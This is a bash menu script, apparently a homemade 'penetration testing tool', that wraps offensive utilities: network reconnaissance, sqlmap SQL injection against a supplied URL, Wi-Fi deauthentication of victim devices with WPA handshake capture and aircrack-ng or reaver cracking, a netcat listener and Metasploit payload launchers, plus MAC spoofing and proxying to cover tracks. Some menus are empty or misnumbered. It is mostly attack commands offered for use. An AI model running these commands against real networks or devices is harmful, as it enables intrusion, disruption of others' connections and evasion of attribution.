#!/bin/bash
echo "    / \   _ __ (_) | _____| |_  | | | | || |   ___| | _|___ / _ __     "
echo "   / _ \ | '_ \| | |/ / _ \ __| | |_| | || |_ / __| |/ / |_ \| '__|    "
echo "  / ___ \| | | | |   <  __/ |_  |  _  |__   _| (__|   < ___) | |       "
echo " /_/   \_\_| |_|_|_|\_\___|\__| |_| |_|  |_|  \___|_|\_\____/|_|       "
echo "                                                                       "
echo "*****************************************************************************"	
echo "                        ANIEKT PENETRATION TESTING TOOL                     "
echo ""
echo "[1] Information Gathering           [4] Wifi Hacking      [7] Covering Track"
echo "[2] Scanning                        [5] Exploitation	      	  "
echo "[3] Sql Injection                   [6] DOS                           "
echo "*****************************************************************************"
echo -e "Enter The Module : \c"
read module
case $module in

1)
echo "*****************************************************************************"	
echo "                        INFORMATION GATHERING [phase I]                      "
echo ""
echo "[1] Ping                    	      	[5] Whois"
echo "[2] WhatWeb                	      	[6] Robtex.com"
echo "[3] Netcraft                            [7] ReverseIpLookup"
echo "[4] BuildWith                           [8] List IP's in Your Network"
echo "[9] The Harvester                       [10] Know Your IP"
echo "*****************************************************************************"
echo -e "Select a Module number: \c"
read option
case $option in
1)
echo -e "Enter The Target URL/IP : \c" 
read p
echo -e "Enter The Number Of Packet : \c"
read packet
ping $p -c $packet
;;
2)
echo -e "Enter The Target Domain : \c"
read domain
whatweb -v $domain
;;
3)
firefox https://www.netcraft.com/
;;
4)
firefox https://builtwith.com/
;;
5)
echo -e "Enter The Target URL : \c"
read turl
whois $turl
#firefox http://whois.domaintools.com
;;
6)
firefox https://www.robtex.com/
;;
7)
firefox https://www.yougetsignal.com/tools/web-sites-on-web-server/
;;
8)
echo -e "Enter The Connnected Interface Card TO discover : \c "
read interface
netdiscover -i $interface
;;
9)
echo -e "Enter Target URL :\c"
read a
echo -e "Enter data source : \c"
read b
theharvester -d $a -b $b
;;
10)
echo "[1] Local IP"
echo "[2] Public IP"
echo -e "Select your option : \c"
read ip
 case $ip in
  1)
  ifconfig
  ;;
  2)
  curl ipinfo.io/ip
  anonym8 status_ip
  ;;
  *)
  echo -e '\e[0;31m【!!】 Invalid option, write a valid number, only 1 & 2 \e[0m'
  exit
  ;;
  esac 
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 10 \e[0m'
exit
;;
esac
;;

2)
echo "*****************************************************************************"	
echo "                        SCANNING [Phase II]                                "
echo ""
echo "[1] NetDiscover"
echo "[2] NMap"
echo "*****************************************************************************"
echo -e "Enter Your Choice : \c"
read choice
case $choice in 
1)
echo -e "Enter The Connnected Interface Card TO discover : \c "
read interface
gnome-terminal -e "netdiscover -i $interface"
;;
2)
echo -e "Enter The Target IP : \c"
read target
nmap -A $target
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 10 \e[0m'
exit
;;
esac
;;

3)
echo "*****************************************************************************"	
echo "                        SQL INJECTION                                        "
echo "*****************************************************************************"
echo -e "Enter The Target URL : \c"
read url
sqlmap -u $url
;;

4)
echo "*****************************************************************************"	
echo "                        WIFI HACKING                                         "
echo ""
echo "[1] BruteForce Method(WPA/WPA2)    "   #[4] Fluxion     	                   "
echo "[2] WPS Cracking                      [4] Create Word List                "
echo "[3] Deauthentication Attack           [5] Monitor/Managed Mode             "
echo "*****************************************************************************"
echo -e "Select a Module number: \c"
read option

case $option in
1)
echo -e "Enter the Wifi Interface_Name :\c"
read interface_Name

ifconfig $interface_Name down
iwconfig $interface_Name mode monitor
ifconfig $interface_Name up

gnome-terminal -e "airodump-ng $interface_Name"

echo -e "Enter The Target Router Mac : \c"
read Mac
echo -e "Enter The Target Channel : \c"
read ch
echo -e "Enter The FileName To Write : \c"
read filename

gnome-terminal -e "airodump-ng --bssid $Mac --channel $ch --write $filename $interface_Name"

echo -e "Enter The Clinet Mac TO Deauth :\c"
read clientmac

gnome-terminal -e "aireplay-ng --deauth 4 -a $Mac -c $clientmac $interface_Name"
echo -e "Enter the Handshake with Full Path : \c"
read handshake
echo -e "Enter the wordlist with Full Path : \c"
read wordlist
gnome-terminal -e "aircrack-ng $handshake -w $wordlist"

xterm -e service network-manager restart
;;
2)
echo -e "Enter the Wifi Interface_Name :\c"
read interface_Name

ifconfig $interface_Name down
iwconfig $interface_Name mode monitor
ifconfig $interface_Name up

gnome-terminal -e "airodump-ng $interface_Name"

echo -e "Enter The Target Macaddress : \c"
read TargetMac
echo -e "Enter The Target Channel : \c"
read channel

gnome-terminal -e "reaver -b $TargetMac -c $channel -i $interface_Name"

xterm -e service netwrok-manager restart
;;
3)
echo -e "Enter the Wifi Interface_Name :\c"
read interface_Name

ifconfig $interface_Name down
iwconfig $interface_Name mode monitor
ifconfig $interface_Name up

gnome-terminal -e "airodump-ng $interface_Name"

echo -e "Enter The Target Router Macaddress : \c"
read targetrouterMac
echo -e "Enter The Target channel : \c"
read targetchannel

gnome-terminal -e "airodump-ng --channel $targetchannel --bssid $targetrouterMac $interface_Name"

echo -e "Enter The Target Victim Macaddress : \c"
read targetmac
echo -e "Enter The Number Of Packet  : \c"
read NumberOfPacket

xterm -e "aireplay-ng --deauth $NumberOfPacket -a $targetrouterMac -c $targetmac $interface_Name"
xterm -e service network-manager restart
;;
4)
./fluxion.sh
#source /root/Desktop/aniketscript/fluxion/fluxion.sh
#bin/bash /root/Desktop/aniketscript/fluxion/fluxion.sh
;;
5)
;;
6)
echo "[1] Monitor Mode"
echo "[2] Managed Mode"
echo -e "Enter Your Choice : \c"
read choice
case $choice in

1)
echo -e "Enter the Wifi Interface_Name :\c"
read interface_Name

ifconfig $interface_Name down
iwconfig $interface_Name mode monitor
ifconfig $interface_Name up
iwconfig
;;

2)
xterm -e service network-manager restart
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 2 \e[0m'
exit
;;
esac

;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 6 \e[0m'
exit
;;
esac
;;

5)
echo "*****************************************************************************"	
echo "                        EXPLOITATION                                         "
echo "[1] Metasploit Frame Work        [4] Create Payload For Android"
echo "[2] Quick Listner (Netcat)"
echo "[3] Create Payload"
echo "*****************************************************************************"
echo -e "Enter Your Choice : \c"
read choice
case $choice in
1)
/etc/init.d/postgresql start
msfconsole
;;
2)
echo -e "Enter The Port Number : \c"
read lport
gnome-terminal -e "nc -lvp $lport"
;;
3)
cdir=`pwd`
source $cdir/payload.sh
bin/bash $cdir/payload.sh
;;
4)
ccdir=`pwd`   #current directory
echo "Checking The Required Library Files"
xterm -e apt-get install zipalign
xterm -e apt-get install lib32stdc++6 lib32ncurses5 lib32z1
source $ccdir/android.sh
bin/bash $ccdir/android.sh
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 4 \e[0m'
exit
;;
esac
;;

6)
echo "*****************************************************************************"	
echo "                        DOS                                                  "
echo " [1] DOS                               [2] DDOS "
echo "*****************************************************************************"
;;

7)
echo "*****************************************************************************"	
echo "                        COVERING TRACK                                      "
echo " [1] Change Mac                              [2] Change IP "
echo "*****************************************************************************"
echo -e "Enter Your Choice : \c"
read choicec
case $choicec in
1)
echo -e "Enter The Interface Card TO Change Mac : \c"
read interfacec
echo -e "Enter The Mac Of Your Choice :\c"
read macinput
ifconfig $interfacec down
ifconfig $interfacec hw ether $macinput
ifconfig $interfacec up
echo "Your mac as been changed to $macinput"
;;
2)
echo "Make sure that anonym8 is installed...."
echo "If not install then click on the follwing link https://github.com/HiroshiManRise/anonym8.git"
echo "[1] Proxy ON "
echo "[2] Proxy OFF "
echo -e "Enter Your Choice : \c"
read choicep
case $choicep in
 1)
 xterm -e anON
 ;;
 2)
 xterm -e anOFF
 ;;
 *)
 echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 2 \e[0m'
 exit
 ;;
 esac
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 2 \e[0m'
exit
;;
esac
;;

*)
echo -e '\e[0;31m【!!】 Invalid option, write a valid number, between 1 & 7 \e[0m'
exit
;;
esac
